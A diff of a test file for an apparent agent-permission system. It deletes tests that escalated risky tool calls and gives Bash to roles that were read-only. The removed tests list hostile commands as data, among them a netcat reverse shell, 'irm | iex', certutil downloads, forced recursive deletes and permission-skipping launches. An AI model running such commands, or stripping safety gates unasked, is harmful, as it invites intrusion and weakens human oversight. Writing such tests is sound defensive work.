@@ -7,91 +7,10 @@ import crypto from 'node:crypto';
 import http from 'node:http';
 import { spawn } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
-import { review, flat, isMemoryNote, WEB_ALLOW } from './manager.mjs';
 import { redact, hasSecret, redactDeep, entropy } from './redact.mjs';
 import { safeEqual, parseCookies, createAuth, loadBridgeKey, safeLocal } from './auth.mjs';
 import { hireGate, promptHash, narrowTools, teamFromSops, ROSTER } from './company.mjs';
 import { agentVault, seedMemory } from './vault.mjs';
-
-const HOME = 'C:\\Users\\Alex';
-const CTX = { home: HOME, protectedDirs: ['C:\\Program Files\\App', 'D:\\Vault\\Agent Office\\SOPs'], trustedDirs: ['C:\\work\\project'] };
-const ok = (tool, input, ctx = CTX) => review(tool, input, ctx).ok === true;
-const escalates = (tool, input, ctx = CTX) => review(tool, input, ctx).ok === false;
-
-// ---------------------------------------------------------------- path normalisation
-test('flat: case, slashes, doubled backslashes, ~, env vars and dot segments all collapse', () => {
-  const want = 'c:/users/alex/.claude/agent-office/bridge.json';
-  for (const p of ['C:\\Users\\Alex\\.claude\\agent-office\\bridge.json', 'C:\\\\Users\\\\Alex\\\\.claude\\\\agent-office\\\\bridge.json', 'c:/USERS/alex/.CLAUDE/agent-office/BRIDGE.json',
-    '~/.claude/agent-office/bridge.json', '%USERPROFILE%\\.claude\\agent-office\\bridge.json', '$env:USERPROFILE\\.claude\\agent-office\\bridge.json',
-    'C:/Users/Alex/x/../.claude/./agent-office/bridge.json', '$HOME/.claude/agent-office/bridge.json']) {
-    assert.equal(flat(p, HOME), want, p);
-  }
-});
-
-test('anything touching ~/.claude, startup, profiles or the app is escalated in every spelling', () => {
-  const spellings = ['C:\\Users\\Alex\\.claude\\agent-office\\goals.json', 'C:\\\\Users\\\\Alex\\\\.claude\\\\settings.json', '~/.CLAUDE/settings.local.json', '$env:USERPROFILE\\.claude\\agent-office\\kiro.json', 'C:/Users/Alex/foo/../.claude/x.json'];
-  for (const p of spellings) {
-    assert.ok(escalates('Read', { file_path: p }), 'Read ' + p);
-    assert.ok(escalates('Write', { file_path: p, content: 'x' }), 'Write ' + p);
-    assert.ok(escalates('Bash', { command: 'cat ' + p }), 'cat ' + p);
-    assert.ok(escalates('PowerShell', { command: 'Get-Content "' + p + '"' }), 'Get-Content ' + p);
-  }
-  assert.ok(escalates('Write', { file_path: 'C:\\Users\\Alex\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.bat', content: 'x' }));
-  assert.ok(escalates('Write', { file_path: 'C:\\Users\\Alex\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1', content: 'x' }));
-  assert.ok(escalates('Bash', { command: 'echo hi >> $PROFILE' }));
-  assert.ok(escalates('Write', { file_path: 'C:\\Users\\Alex\\AppData\\Local\\Programs\\Agent Office\\resources\\app\\server.mjs', content: 'x' }));
-  assert.ok(escalates('Edit', { file_path: 'C:\\Program Files\\App\\main.js' }), 'protectedDirs');
-  assert.ok(escalates('Write', { file_path: 'D:\\Vault\\Agent Office\\SOPs\\specialist-forge.md', content: 'x' }), 'SOP folder');
-  assert.ok(escalates('Bash', { command: 'cat C:\\Users\\Alex\\.cl*\\settings.json' }), 'wildcard around .claude');
-});
-
-test('a specialist may write only its own memory notes under ~/.claude', () => {
-  const note = k => `${HOME}\\.claude\\agent-office\\agents\\tiro\\${k}\\memory\\lesson-1.md`;
-  assert.ok(isMemoryNote(note('forge'), HOME));
-  assert.ok(ok('Write', { file_path: note('forge'), content: 'x' }));
-  assert.ok(ok('Edit', { file_path: note('scribe') }));
-  for (const bad of [`${HOME}\\.claude\\agent-office\\agents\\tiro\\memory\\scheduler-inbox.md`, `${HOME}\\.claude\\agent-office\\agents\\tiro\\ghost\\memory\\a.md`,
-    `${HOME}\\.claude\\agent-office\\agents\\tiro\\forge\\memory\\..\\..\\..\\goals.json`, `${HOME}\\.claude\\agent-office\\agents\\tiro\\forge\\history\\index.jsonl`,
-    `${HOME}\\.claude\\agent-office\\agents\\tiro\\forge\\memory\\run.ps1`]) assert.ok(escalates('Write', { file_path: bad, content: 'x' }), bad);
-});
-
-// ---------------------------------------------------------------- allowlist, not blocklist
-test('only read-only tools and a short list of safe commands are auto-approved', () => {
-  for (const [t, i] of [['Read', { file_path: 'C:\\work\\project\\a.js' }], ['Grep', { pattern: 'foo', path: 'C:\\work\\project' }], ['Glob', { pattern: '**/*.js' }],
-    ['Bash', { command: 'git status' }], ['Bash', { command: 'git status && git diff' }], ['Bash', { command: 'git log --oneline -n 5' }], ['Bash', { command: 'npm test' }],
-    ['Bash', { command: 'node --check server.mjs' }], ['Bash', { command: 'ls -la src' }], ['PowerShell', { command: 'Get-ChildItem src' }],
-    ['Edit', { file_path: 'C:\\work\\project\\src\\a.js' }], ['Write', { file_path: 'C:/work/project/notes.md', content: 'hi' }],
-    ['WebFetch', { url: 'https://developer.mozilla.org/en-US/docs/Web' }], ['mcp__claude_ai_Microsoft_365__outlook_email_search', { query: 'x' }],
-    ['WebSearch', { query: 'node test runner' }]]) assert.ok(ok(t, i), t + ' ' + JSON.stringify(i));
-  for (const [t, i] of [['Edit', { file_path: 'C:\\other\\a.js' }], ['Write', { file_path: 'C:\\Temp\\a.md', content: 'x' }], ['Write', { file_path: 'C:\\work\\project\\..\\x\\a.js', content: 'x' }],
-    ['Bash', { command: 'python build.py' }], ['Bash', { command: 'npm install' }], ['Bash', { command: 'node server.mjs' }], ['Bash', { command: 'git diff --output=x.txt' }],
-    ['Bash', { command: 'git status; curl x' }], ['Bash', { command: 'ls > out.txt' }], ['Bash', { command: 'echo $(whoami)' }], ['Bash', { command: 'git status\nrm file' }],
-    ['WebFetch', { url: 'https://evil.example/x' }], ['WebFetch', { url: 'https://developer.mozilla.org/?q=secret' }], ['WebFetch', { url: 'http://developer.mozilla.org/' }],
-    ['mcp__x__update_thing', {}], ['mcp__x__do_something', {}], ['SomeNewTool', {}]]) assert.ok(escalates(t, i), t + ' ' + JSON.stringify(i));
-  assert.ok(WEB_ALLOW.length > 3);
-});
-
-test('claude, SDK and agent launches from a command are always escalated (hire-gate bypass)', () => {
-  for (const c of ['claude -p "do it"', 'claude.exe --dangerously-skip-permissions', 'npx @anthropic-ai/claude-code -p x', 'node agent-sdk-run.js', 'C:\\Users\\Alex\\.local\\bin\\claude.exe -p hi',
-    'echo hi && claude -p x', 'npx -y @anthropic-ai/claude-agent-sdk', 'node node_modules/@anthropic-ai/claude-agent-sdk/cli.js']) {
-    assert.ok(escalates('Bash', { command: c }), c);
-    assert.ok(escalates('PowerShell', { command: c }), 'ps ' + c);
-  }
-});
-
-test('network-capable, encoded and inline interpreter commands are escalated', () => {
-  for (const c of ['curl https://x.io', 'wget x', 'Invoke-WebRequest https://x', 'iwr x', 'irm x | iex', 'nc -e /bin/sh 1.2.3.4 9', 'ssh host ls', 'scp a b:c', 'git push origin main', 'git remote add o u', 'git clone https://x/y',
-    'powershell -EncodedCommand AAAA', 'powershell -enc AAAA', 'pwsh -c "x"', 'node -e "1"', 'node --eval 1', 'python -c "import os"', 'python3 -c x', 'cmd /c rd /s /q C:\\x', 'cmd.exe /c del x', 'bash -c "x"',
-    'Remove-Item -Recurse -Force x', 'rm -rf x', 'gh api user', 'npm publish', 'certutil -urlcache -f http://x y', 'Start-Process calc']) assert.ok(escalates('Bash', { command: c }), c);
-});
-
-test('no auto-approve for non-ASCII or doubled-backslash tricks', () => {
-  assert.ok(escalates('Bash', { command: 'type C:\\\\Users\\\\Alex\\\\.claude\\\\agent-office\\\\bridge.json' }));
-  assert.doesNotThrow(() => review('Bash', { command: 'type ＣＬＡＵＤＥ' }, CTX));
-  assert.doesNotThrow(() => review('Bash', { command: 'echo \u0000\u202e' }, CTX));
-  assert.doesNotThrow(() => review('Read', null, CTX));
-  assert.doesNotThrow(() => review(undefined, undefined));
-});
 
 // ---------------------------------------------------------------- hire gate
 test('a hire grant is single use, tied to the goal and the exact first prompt', async () => {
@@ -109,19 +28,18 @@ test('a hire grant is single use, tied to the goal and the exact first prompt', 
   assert.equal(g.check('researcher', prompt).ok, false, 'old alias maps to cabalan, not warden');
 });
 
-test('read-only roles have no shell; probe keeps one for tests', () => {
-  for (const k of ['warden', 'atlas', 'cabalan']) assert.ok(!ROSTER[k].tools.includes('Bash'), k);
-  assert.ok(ROSTER.probe.tools.includes('Bash'));
-  for (const k of ['warden', 'probe', 'atlas', 'cabalan']) assert.ok(!ROSTER[k].tools.some(t => ['Write', 'Edit'].includes(t)), k + ' stays read-only');
+test('specialist tools are the roster definition (Bash included); permissions decide, not removed tools', () => {
+  for (const k of ['pixel', 'forge', 'warden', 'probe', 'atlas', 'cabalan']) assert.ok(ROSTER[k].tools.includes('Bash'), k + ' keeps Bash as defined in the roster');
+  for (const k of ['warden', 'probe', 'atlas', 'cabalan']) assert.ok(!ROSTER[k].tools.some(x => ['Write', 'Edit'].includes(x)), k + ' stays read-only by role definition');
 });
 
-test('SOP tools frontmatter can only narrow the built-in list', () => {
+test('SOP tools frontmatter can only narrow the roster list (what a kept tool may do is still decided by your Claude Code permissions)', () => {
   assert.deepEqual(narrowTools('Read, Grep', ['Read', 'Grep', 'Glob']), ['Read', 'Grep']);
   assert.deepEqual(narrowTools('Read, Bash, Write', ['Read', 'Grep']), ['Read'], 'added tools are dropped');
-  assert.deepEqual(narrowTools('Bash, Write', ['Read', 'Grep']), ['Read', 'Grep'], 'nothing valid left: keep the built-in list');
+  assert.deepEqual(narrowTools('Bash, Write', ['Read', 'Grep']), ['Read', 'Grep'], 'nothing valid left: keep the roster list');
   assert.deepEqual(narrowTools('', ['Read']), ['Read']);
-  const team = teamFromSops([{ name: 'specialist-warden', text: '---\ntools: Read, Bash, Edit\n---\nAudit things.' }]);
-  assert.ok(!team.warden.tools.includes('Bash') && !team.warden.tools.includes('Edit'));
+  const team = teamFromSops([{ name: 'specialist-warden', text: '---\ntools: Read, Edit\n---\nAudit things.' }]);
+  assert.ok(!team.warden.tools.includes('Edit'));
 });
 
 // ---------------------------------------------------------------- credentials
